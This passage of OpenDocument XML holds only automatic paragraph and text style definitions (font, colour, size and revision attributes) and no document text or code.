      <style:paragraph-properties fo:orphans="2" fo:widows="2"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P112" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00423cc4" officeooo:paragraph-rsid="00458729"/>
    </style:style>
    <style:style style:name="P113" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0046416a" officeooo:paragraph-rsid="0046416a"/>
    </style:style>
    <style:style style:name="P114"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239bb" officeooo:paragraph-rsid="003473e4" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P115" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003a2c01" officeooo:paragraph-rsid="003ad1eb" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P116" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:paragraph-rsid="00673b4a" fo:background-color="#232525" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P117" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc7832" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:paragraph-rsid="00844288" fo:background-color="#232525" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P118" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00a56f34" officeooo:paragraph-rsid="00aa62b4"/>
    </style:style>
    <style:style style:name="P119" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00acb0e2" officeooo:paragraph-rsid="00b03d32"/>
    </style:style>
    <style:style style:name="P120" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00b08a55" officeooo:paragraph-rsid="00b08a55"/>
    </style:style>
    <style:style style:name="P121" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:orphans="2" fo:widows="2"/>
    </style:style>
    <style:style style:name="P122" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="0075f85d"/>
    </style:style>
    <style:style style:name="P123" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono"/>
    </style:style>
    <style:style style:name="P124" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false" fo:orphans="2" fo:widows="2"/>
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono"/>
    </style:style>
    <style:style style:name="P125" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false" fo:orphans="2" fo:widows="2"/>
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" officeooo:rsid="004d7663" officeooo:paragraph-rsid="004d7663"/>
    </style:style>
    <style:style style:name="P126" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties fo:color="#a9b7c6" style:font-name="DejaVu Sans Mono" fo:background-color="#232525"/>
    </style:style>
    <style:style style:name="P1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style:style>
    <style:style style:name="P1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style:style>
    <style:style style:name="P1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4d7663" officeooo:paragraph-rsid="004d7663"/>
    </style:style>
    <style:style style:name="P130" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false" fo:orphans="2" fo:widows="2"/>
    </style:style>
    <style:style style:name="P131" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false" fo:orphans="2" fo:widows="2" style:writing-mode="lr-tb"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P132" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:orphans="2" fo:widows="2" style:writing-mode="lr-tb"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P133" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:orphans="2" fo:widows="2" style:writing-mode="lr-tb"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P134" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="000e6a2f" officeooo:paragraph-rsid="000e6a2f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P135" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="000eaa87" officeooo:paragraph-rsid="000eaa87" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P136" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="000eaa87" officeooo:paragraph-rsid="000eaa87" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P137" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00108dfc" officeooo:paragraph-rsid="00108dfc" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P138" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00673b4a" officeooo:paragraph-rsid="00673b4a" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P139" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L5">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00813e98" officeooo:paragraph-rsid="00813e98" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P140" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L8">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00875f19" officeooo:paragraph-rsid="00875f19" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P141" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0091ef89" officeooo:paragraph-rsid="0091ef89" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P142" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L11">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00a56f34" officeooo:paragraph-rsid="00a56f34" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P143" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L11">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00a56f34" officeooo:paragraph-rsid="00a56f34"/>
    </style:style>
    <style:style style:name="P144" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L12">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00bd1b96" officeooo:paragraph-rsid="00bd1b96" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P145" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L12">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00bd1b96" officeooo:paragraph-rsid="00bd1b96" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P146" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00bde7b9" officeooo:paragraph-rsid="00c27583" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P147" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00bde7b9" officeooo:paragraph-rsid="00bea77d" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P148" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00bf64c0" officeooo:paragraph-rsid="00bf64c0" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P149" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L13">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Times New Roman" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00c10ef9" officeooo:paragraph-rsid="00c5bb92" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P150" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00673b4a" officeooo:paragraph-rsid="00673b4a"/>
    </style:style>
    <style:style style:name="P151" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00673b4a" officeooo:paragraph-rsid="006e8ca9"/>
    </style:style>
    <style:style style:name="P152" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L5">
      <style:text-properties officeooo:paragraph-rsid="0096f4da"/>
    </style:style>
    <style:style style:name="P153" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L5">
      <style:text-properties officeooo:rsid="0080c4a4" officeooo:paragraph-rsid="00954d43"/>
    </style:style>
    <style:style style:name="P154" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:text-properties officeooo:rsid="00826541" officeooo:paragraph-rsid="00826541"/>
    </style:style>
    <style:style style:name="P155" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:text-properties officeooo:rsid="00826541" officeooo:paragraph-rsid="0097a4d3"/>
    </style:style>
    <style:style style:name="P156" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L7">
      <style:text-properties officeooo:rsid="00826541" officeooo:paragraph-rsid="00858417"/>
    </style:style>
    <style:style style:name="P157" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L8">
      <style:text-properties officeooo:rsid="00826541" officeooo:paragraph-rsid="0086caef"/>
    </style:style>
    <style:style style:name="P158" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:text-properties officeooo:rsid="00844288" officeooo:paragraph-rsid="00844288"/>
    </style:style>
    <style:style style:name="P159" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L7">
      <style:text-properties officeooo:rsid="00858417" officeooo:paragraph-rsid="0085f5a8"/>
    </style:style>
    <style:style style:name="P160" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L8">
      <style:text-properties officeooo:rsid="0086caef" officeooo:paragraph-rsid="0086caef"/>
    </style:style>
    <style:style style:name="P161" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9">
      <style:text-properties officeooo:rsid="0089670a" officeooo:paragraph-rsid="00954d43"/>
    </style:style>
    <style:style style:name="P162" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10">
      <style:text-properties officeooo:rsid="008b4fdb" officeooo:paragraph-rsid="008b4fdb"/>
    </style:style>
    <style:style style:name="P163" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10">
      <style:text-properties officeooo:rsid="008f0b64" officeooo:paragraph-rsid="008f0b64"/>
    </style:style>
    <style:style style:name="P164" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10">
      <style:text-properties officeooo:rsid="0091009a" officeooo:paragraph-rsid="0091009a"/>
    </style:style>
    <style:style style:name="P165" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L14">
      <style:text-properties officeooo:rsid="00d04863" officeooo:paragraph-rsid="00d04863"/>
    </style:style>
    <style:style style:name="P166" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L14">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d04863" officeooo:paragraph-rsid="00d04863" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P167" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L14">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d0f1e8" officeooo:paragraph-rsid="00d0f1e8" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P168" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L14">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d0f1e8" officeooo:paragraph-rsid="00d5879d" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P169" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L14">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d27d13" officeooo:paragraph-rsid="00d27d13" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P170" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L15">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d309da" officeooo:paragraph-rsid="00d309da" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P171" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L15">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d309da" officeooo:paragraph-rsid="00d69ac1" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P172" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L15">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d3d167" officeooo:paragraph-rsid="00d3d167" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P173" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="00d96bc1" officeooo:paragraph-rsid="00d96bc1" style:font-size-asian="14pt" style:font-size-complex="14pt"/>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b8aed" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="000c5055" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="000cae8e" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="000d290d" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="000dc684" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0019a4d7" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties style:text-underline-style="none"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="000b8aed"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="000c5055"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="000d290d"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="000dc684"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="000eaa87"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002935a7" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002b2cfd" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002cf288" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002d6bf8" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002d6e15" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties officeooo:rsid="000a04cd"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties officeooo:rsid="000b8aed"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="000c5055"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="000cae8e"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="000d290d"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="000dc684"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties officeooo:rsid="0019a4d7"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties officeooo:rsid="001dcdaf"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties officeooo:rsid="0023ee0f"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="002cf288"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="002cf288" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="00649883" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006547ce" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0065baac" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="0069fe41" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006a6ad7" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006c16a4" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006d5189" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006e8ca9" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="006a6ad7" fo:background-color="#232525" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T4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43" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00759b17" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T44" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00744e95" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T45" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0075f85d" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T46" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0078207f" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T47" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0079ae3a" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T48" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007addbd" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007c436a" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007e0a32" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="007f359c" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T52" style:family="text">
